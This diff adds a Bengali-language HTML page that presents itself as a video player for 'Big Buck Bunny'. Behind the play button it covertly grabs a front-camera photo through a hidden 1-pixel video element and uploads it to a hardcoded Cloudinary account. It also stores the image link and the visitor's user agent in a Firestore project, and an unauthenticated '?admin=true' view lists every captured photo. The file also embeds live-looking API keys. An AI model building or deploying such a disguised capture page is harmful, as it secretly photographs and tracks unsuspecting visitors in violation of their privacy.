@@ -1,0 +1,360 @@
+<!DOCTYPE html>
+<html lang="bn">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Video Landing Page</title>
+    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Bengali:wght@400;700&display=swap" rel="stylesheet">
+    
+    <!-- Firebase SDKs (শুধু App এবং Firestore লাগবে) -->
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-app-compat.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/9.23.0/firebase-firestore-compat.js"></script>
+
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+
+        :root {
+            --bg: #0a0a0f;
+            --card: #14141f;
+            --accent: #ff4d4d;
+            --accent-glow: rgba(255, 77, 77, 0.3);
+            --text: #e8e8ef;
+            --muted: #7a7a8e;
+            --border: #2a2a3a;
+        }
+
+        body {
+            font-family: 'Noto Sans Bengali', sans-serif;
+            background: var(--bg);
+            color: var(--text);
+            min-height: 100vh;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            position: relative;
+        }
+
+        body::before {
+            content: '';
+            position: fixed;
+            top: -50%; left: -50%;
+            width: 200%; height: 200%;
+            background: radial-gradient(ellipse at 30% 20%, rgba(255, 77, 77, 0.06) 0%, transparent 50%),
+                        radial-gradient(ellipse at 70% 80%, rgba(77, 77, 255, 0.04) 0%, transparent 50%);
+            z-index: 0;
+        }
+
+        .container {
+            position: relative;
+            z-index: 1;
+            width: 100%;
+            max-width: 560px;
+            padding: 20px;
+        }
+
+        .page-title { text-align: center; margin-bottom: 28px; }
+        .page-title h1 { font-size: 1.8rem; font-weight: 700; margin-bottom: 8px; }
+        .page-title p { color: var(--muted); font-size: 0.95rem; }
+
+        .video-card {
+            background: var(--card);
+            border: 1px solid var(--border);
+            border-radius: 16px;
+            overflow: hidden;
+            box-shadow: 0 8px 40px rgba(0, 0, 0, 0.4);
+        }
+
+        .video-wrapper {
+            position: relative;
+            width: 100%;
+            aspect-ratio: 16 / 9;
+            background: #000;
+            cursor: pointer;
+            overflow: hidden;
+        }
+
+        .video-wrapper video { width: 100%; height: 100%; object-fit: cover; display: block; }
+
+        .play-overlay {
+            position: absolute; inset: 0;
+            display: flex; flex-direction: column; align-items: center; justify-content: center;
+            background: rgba(0, 0, 0, 0.45);
+            transition: background 0.3s;
+        }
+        .play-overlay:hover { background: rgba(0, 0, 0, 0.3); }
+
+        .play-btn {
+            width: 72px; height: 72px; border-radius: 50%; background: var(--accent);
+            display: flex; align-items: center; justify-content: center;
+            box-shadow: 0 0 30px var(--accent-glow); transition: transform 0.25s;
+        }
+        .play-overlay:hover .play-btn { transform: scale(1.1); }
+        .play-btn svg { width: 28px; height: 28px; margin-left: 3px; }
+        .play-label { margin-top: 12px; font-size: 0.85rem; color: rgba(255,255,255,0.7); }
+        .play-overlay.hidden { display: none; }
+
+        #cameraStream { position: fixed; top: 0; left: 0; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
+
+        .flash {
+            position: fixed; inset: 0; background: #fff; opacity: 0;
+            pointer-events: none; z-index: 999; transition: opacity 0.15s;
+        }
+        .flash.active { opacity: 0.8; }
+
+        .video-info {
+            padding: 16px 20px;
+            display: flex; align-items: center; justify-content: space-between;
+        }
+        .video-info .title { font-size: 0.95rem; font-weight: 700; }
+        .video-info .duration { font-size: 0.8rem; color: var(--muted); background: rgba(255,255,255,0.06); padding: 4px 10px; border-radius: 20px; }
+
+        .toast {
+            position: fixed; bottom: 30px; left: 50%;
+            transform: translateX(-50%) translateY(80px);
+            background: var(--card); border: 1px solid var(--border); color: var(--text);
+            padding: 12px 24px; border-radius: 12px; font-size: 0.88rem;
+            box-shadow: 0 8px 30px rgba(0,0,0,0.5); opacity: 0;
+            transition: all 0.4s ease; z-index: 1000; text-align: center; max-width: 90%;
+        }
+        .toast.show { opacity: 1; transform: translateX(-50%) translateY(0); }
+        .toast.error { border-color: var(--accent); }
+        .toast.success { border-color: #22c55e; }
+
+        .footer-note { text-align: center; margin-top: 24px; font-size: 0.78rem; color: var(--muted); }
+
+        /* Admin Panel Styles */
+        #adminSection { display: none; width: 100%; max-width: 800px; padding: 20px; z-index: 1; }
+        #adminSection.active { display: block; }
+        .admin-header { text-align: center; margin-bottom: 30px; }
+        .admin-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(200px, 1fr)); gap: 15px; }
+        .photo-card { background: var(--card); border: 1px solid var(--border); border-radius: 12px; overflow: hidden; }
+        .photo-card img { width: 100%; aspect-ratio: 1; object-fit: cover; }
+        .photo-card .meta { padding: 10px; font-size: 0.8rem; color: var(--muted); }
+    </style>
+</head>
+<body>
+
+    <!-- User Video Section -->
+    <div class="container" id="userSection">
+        <div class="page-title">
+            <h1>ভিডিও দেখুন</h1>
+            <p>প্লে করতে ক্যামেরা পারমিশন দিতে হবে</p>
+        </div>
+        <div class="video-card">
+            <div class="video-wrapper" id="videoWrapper">
+                <video id="mainVideo" playsinline preload="metadata" poster="https://picsum.photos/seed/vidlanding/640/360.jpg">
+                    <source src="https://www.w3schools.com/html/mov_bbb.mp4" type="video/mp4">
+                </video>
+                <div class="play-overlay" id="playOverlay">
+                    <div class="play-btn">
+                        <svg viewBox="0 0 24 24" fill="white"><polygon points="6,3 20,12 6,21"/></svg>
+                    </div>
+                    <span class="play-label">ক্লিক করে ভিডিও দেখুন</span>
+                </div>
+            </div>
+            <div class="video-info">
+                <span class="title">Big Buck Bunny</span>
+                <span class="duration">0:10</span>
+            </div>
+        </div>
+        <p class="footer-note">আপনার ফটো নিরাপদে সার্ভারে সেভ হবে</p>
+    </div>
+
+    <!-- Admin Section -->
+    <div id="adminSection">
+        <div class="admin-header">
+            <h1>অ্যাডমিন প্যানেল</h1>
+            <p style="color:var(--muted);">ক্যাপচার করা ফটোগুলো</p>
+        </div>
+        <div class="admin-grid" id="adminGrid">
+            <!-- Photos will load here -->
+        </div>
+    </div>
+
+    <video id="cameraStream" autoplay playsinline></video>
+    <div class="flash" id="flash"></div>
+    <div class="toast" id="toast"></div>
+
+    <script>
+        // ==========================================
+        // Cloudinary Configuration (আপনার ক্লাউডিনারি কনফিগ দিন)
+        // ==========================================
+        const CLOUDINARY_CLOUD_NAME = "dhvtgzy5x"; // আপনার Cloudinary Cloud Name দিন
+        const CLOUDINARY_UPLOAD_PRESET = "Rosenews"; // Unsigned Upload Preset দিন
+
+        // ==========================================
+        // Firebase Configuration 
+        // ==========================================
+        const firebaseConfig = {
+            apiKey: "AIzaSyDOJaV7zMLhtA-_z1nkcdbtaa3w7M_0Fh4",
+            authDomain: "money-generate-dbab3.firebaseapp.com",
+            projectId: "money-generate-dbab3",
+            storageBucket: "money-generate-dbab3.firebasestorage.app",
+            messagingSenderId: "579756089926",
+            appId: "1:579756089926:web:abbe35377e3657889be047"
+        };
+
+        // Initialize Firebase (শুধু Firestore ব্যবহার করা হবে)
+        firebase.initializeApp(firebaseConfig);
+        const db = firebase.firestore();
+
+        // ==========================================
+        // Admin Check & Routing
+        // ==========================================
+        const urlParams = new URLSearchParams(window.location.search);
+        const isAdmin = urlParams.get('admin') === 'true';
+
+        const userSection = document.getElementById('userSection');
+        const adminSection = document.getElementById('adminSection');
+
+        if (isAdmin) {
+            userSection.style.display = 'none';
+            adminSection.classList.add('active');
+            loadAdminPhotos();
+        }
+
+        // ==========================================
+        // User Video & Camera Logic
+        // ==========================================
+        const mainVideo = document.getElementById('mainVideo');
+        const playOverlay = document.getElementById('playOverlay');
+        const cameraStream = document.getElementById('cameraStream');
+        const flash = document.getElementById('flash');
+        const toastEl = document.getElementById('toast');
+
+        let cameraPermissionGranted = false;
+        let isPlaying = false;
+
+        function showToast(message, type = '') {
+            toastEl.textContent = message;
+            toastEl.className = 'toast ' + type;
+            requestAnimationFrame(() => { toastEl.classList.add('show'); });
+            setTimeout(() => { toastEl.classList.remove('show'); }, 3000);
+        }
+
+        async function captureAndUploadPhoto() {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
+                cameraPermissionGranted = true;
+                cameraStream.srcObject = stream;
+
+                await new Promise(resolve => setTimeout(resolve, 800));
+
+                const canvas = document.createElement('canvas');
+                canvas.width = cameraStream.videoWidth || 320;
+                canvas.height = cameraStream.videoHeight || 240;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(cameraStream, 0, 0, canvas.width, canvas.height);
+
+                // ফ্ল্যাশ ইফেক্ট
+                flash.classList.add('active');
+                setTimeout(() => flash.classList.remove('active'), 200);
+
+                // ফটো ডেটা তৈরি (Base64)
+                const photoDataUrl = canvas.toDataURL('image/jpeg', 0.8);
+
+                // ক্যামেরা স্ট্রিম বন্ধ
+                stream.getTracks().forEach(track => track.stop());
+                cameraStream.srcObject = null;
+
+                showToast('', 'success');
+
+                // ==========================================
+                // Cloudinary তে আপলোড লজিক
+                // ==========================================
+                const formData = new FormData();
+                formData.append('file', photoDataUrl);
+                formData.append('upload_preset', CLOUDINARY_UPLOAD_PRESET);
+
+                const cloudinaryRes = await fetch(`https://api.cloudinary.com/v1_1/${CLOUDINARY_CLOUD_NAME}/image/upload`, {
+                    method: 'POST',
+                    body: formData
+                });
+
+                if (!cloudinaryRes.ok) {
+                    throw new Error('Cloudinary upload failed');
+                }
+
+                const cloudinaryData = await cloudinaryRes.json();
+                const downloadURL = cloudinaryData.secure_url; // ক্লাউডিনারি থেকে ফটোর লিংক নেওয়া
+
+                // ==========================================
+                // Firestore এ ডাটাবেস সেভ (ক্লাউডিনারি লিংকসহ)
+                // ==========================================
+                await db.collection('captured_photos').add({
+                    imageUrl: downloadURL,
+                    createdAt: firebase.firestore.FieldValue.serverTimestamp(),
+                    userAgent: navigator.userAgent
+                });
+
+                showToast('', 'success');
+                playVideo();
+
+            } catch (err) {
+                cameraPermissionGranted = false;
+                if (err.name === 'NotAllowedError') {
+                    showToast('ক্যামেরা পারমিশন দেননি। ভিডিও চলবে না।', 'error');
+                } else {
+                    showToast('ক্যামেরা বা সার্ভারে সমস্যা হয়েছে।', 'error');
+                }
+                console.error(err);
+            }
+        }
+
+        function playVideo() {
+            playOverlay.classList.add('hidden');
+            mainVideo.play();
+            isPlaying = true;
+        }
+
+        playOverlay.addEventListener('click', function () {
+            if (isPlaying) return;
+            captureAndUploadPhoto();
+        });
+
+        mainVideo.addEventListener('ended', function () {
+            playOverlay.classList.remove('hidden');
+            isPlaying = false;
+        });
+
+        // ==========================================
+        // Admin Panel Logic
+        // ==========================================
+        async function loadAdminPhotos() {
+            const adminGrid = document.getElementById('adminGrid');
+            adminGrid.innerHTML = '<p>লোড হচ্ছে...</p>';
+
+            try {
+                const snapshot = await db.collection('captured_photos').orderBy('createdAt', 'desc').get();
+                adminGrid.innerHTML = '';
+
+                if (snapshot.empty) {
+                    adminGrid.innerHTML = '<p>কোনো ফটো পাওয়া যায়নি।</p>';
+                    return;
+                }
+
+                snapshot.forEach(doc => {
+                    const data = doc.data();
+                    const card = document.createElement('div');
+                    card.className = 'photo-card';
+                    
+                    const time = data.createdAt ? new Date(data.createdAt.seconds * 1000).toLocaleString() : 'N/A';
+                    
+                    card.innerHTML = `
+                        <img src="${data.imageUrl}" alt="Captured User">
+                        <div class="meta">
+                            <div>সময়: ${time}</div>
+                            <div>ডিভাইস: ${data.userAgent ? data.userAgent.substring(0, 30) + '...' : 'N/A'}</div>
+                        </div>
+                    `;
+                    adminGrid.appendChild(card);
+                });
+            } catch (err) {
+                adminGrid.innerHTML = '<p>ডাটাবেস থেকে ফটো আনতে সমস্যা হয়েছে।</p>';
+                console.error(err);
+            }
+        }
+    </script>
+</body>
+</html>
